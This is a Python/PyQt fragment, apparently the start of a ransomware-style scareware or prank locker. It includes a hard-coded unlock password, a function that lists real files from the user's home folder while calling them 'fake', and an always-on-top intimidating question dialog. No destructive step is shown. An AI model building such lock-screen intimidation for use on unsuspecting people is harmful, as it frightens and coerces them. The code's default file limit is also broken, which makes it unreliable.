# ==== Картинки в Base64 (заглушки) ====
# Когда будут свои картинки, замени содержимое этих переменных
JESTER_IMG_BASE64 = b""
INTRO_IMG_BASE64  = b""

# === Пароль для разблокировки ===
UNLOCK_PASSWORD = "12345"

# ==== Функция для загрузки картинки из Base64 ====
def pixmap_from_base64(data):
    pixmap = QPixmap()
    pixmap.loadFromData(base64.b64decode(data))
    return pixmap

# ==== Генерация фейковых файлов ====
def generate_real_files(max_files=None):
    files = []
    home_path = os.path.expanduser("~")  # домашняя папка пользователя
    count = 0
    for root, dirs, filenames in os.walk(home_path):
        for file in filenames:
            files.append(os.path.join(root, file))
            count += 1
            if count >= max_files:  # ограничение, чтобы программа не зависала
                return files
    return files

# ==== Окно вопроса ====
class IntroDialog(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Question")
        self.setFixedSize(400, 350)
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.CustomizeWindowHint)

        layout = QVBoxLayout()
        self.setStyleSheet("background-color: black; color: red; font-family: Courier; font-size: 16px;")

        # Картинка из Base64
        img_label = QLabel()
        img_label.setPixmap(pixmap_from_base64(INTRO_IMG_BASE64).scaledToWidth(300, Qt.SmoothTransformation))
        img_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(img_label)

        # Текст вопроса
        question = QLabel("Are you a 1 or a 0?")
        question.setAlignment(Qt.AlignCenter)
        layout.addWidget(question)

        # Поле ввода
        self.input_field = QLineEdit()
        self.input_field.setPlaceholderText("Enter number...")
        self.input_field.setAlignment(Qt.AlignCenter)
        self.input_field.setStyleSheet("background-color: black; color: red; border: 1px solid red;")
        layout.addWidget(self.input_field)

        # Кнопка
        btn = QPushButton("Accept")
        btn.setStyleSheet("background-color: black; color: red; border: 1px solid red; padding: 4px;")
        btn.clicked.connect(self.accept_input)
        layout.addWidget(btn)

        self.setLayout(layout)
        self.choice = None

    def accept_input(self):
        self.choice = self.input_field.text().strip()
        self.accept()

